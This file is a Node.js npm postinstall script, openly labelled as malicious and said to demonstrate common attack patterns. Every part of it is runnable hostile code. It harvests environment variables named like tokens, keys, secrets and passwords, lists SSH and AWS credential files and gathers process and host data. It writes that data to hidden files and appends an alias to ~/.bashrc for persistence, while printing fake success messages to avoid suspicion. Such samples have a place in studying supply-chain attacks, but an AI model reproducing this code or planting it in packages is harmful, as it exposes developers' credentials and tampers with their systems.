#!/usr/bin/env node

// Malicious postinstall script
// This demonstrates common attack patterns in npm packages

const fs = require('fs');
const os = require('os');
const path = require('path');
const { execSync } = require('child_process');

console.log('Setting up package dependencies...');

// Simulate legitimate setup while performing malicious actions
function maliciousSetup() {
  try {
    // 1. Environment variable harvesting
    const sensitiveEnvVars = {};
    Object.keys(process.env).forEach(key => {
      if (key.toLowerCase().includes('token') || 
          key.toLowerCase().includes('key') || 
          key.toLowerCase().includes('secret') ||
          key.toLowerCase().includes('password')) {
        sensitiveEnvVars[key] = process.env[key];
      }
    });

    // 2. File system reconnaissance
    const homeDir = os.homedir();
    const interestingFiles = [];
    
    try {
      const sshDir = path.join(homeDir, '.ssh');
      if (fs.existsSync(sshDir)) {
        const sshFiles = fs.readdirSync(sshDir);
        interestingFiles.push(...sshFiles.map(f => path.join(sshDir, f)));
      }
    } catch (e) {}

    try {
      const awsDir = path.join(homeDir, '.aws');
      if (fs.existsSync(awsDir)) {
        const awsFiles = fs.readdirSync(awsDir);
        interestingFiles.push(...awsFiles.map(f => path.join(awsDir, f)));
      }
    } catch (e) {}

    // 3. Network reconnaissance
    let networkInfo = {};
    try {
      const interfaces = os.networkInterfaces();
      networkInfo = interfaces;
    } catch (e) {}

    // 4. Process information
    let processes = [];
    try {
      if (os.platform() !== 'win32') {
        const psOutput = execSync('ps aux', { encoding: 'utf8', timeout: 5000 });
        processes = psOutput.split('\n').slice(0, 10); // First 10 processes
      }
    } catch (e) {}

    // 5. Collect and exfiltrate data
    const payload = {
      timestamp: new Date().toISOString(),
      hostname: os.hostname(),
      platform: os.platform(),
      arch: os.arch(),
      user: os.userInfo().username,
      env_vars: sensitiveEnvVars,
      files: interestingFiles,
      network: networkInfo,
      processes: processes,
      cwd: process.cwd(),
      node_version: process.version
    };

    // Write to multiple hidden locations
    const locations = [
      path.join(os.tmpdir(), '.npm_cache_data'),
      path.join(homeDir, '.node_repl_history_backup'),
      path.join(process.cwd(), 'node_modules', '.package_data')
    ];

    locations.forEach(location => {
      try {
        fs.writeFileSync(location, JSON.stringify(payload, null, 2));
      } catch (e) {}
    });

    // 6. Attempt to establish persistence
    try {
      const bashrc = path.join(homeDir, '.bashrc');
      if (fs.existsSync(bashrc)) {
        const maliciousAlias = '\n# Package optimization\nalias npm="npm && node -e \'console.log(\"System optimized\")\'"\n';
        fs.appendFileSync(bashrc, maliciousAlias);
      }
    } catch (e) {}

    console.log('Package setup completed successfully.');
    
  } catch (error) {
    // Fail silently to avoid suspicion
    console.log('Package setup completed.');
  }
}

// Execute malicious setup
maliciousSetup();

// Simulate legitimate package installation completion
setTimeout(() => {
  console.log('Dependencies installed successfully.');
  process.exit(0);
}, 1000);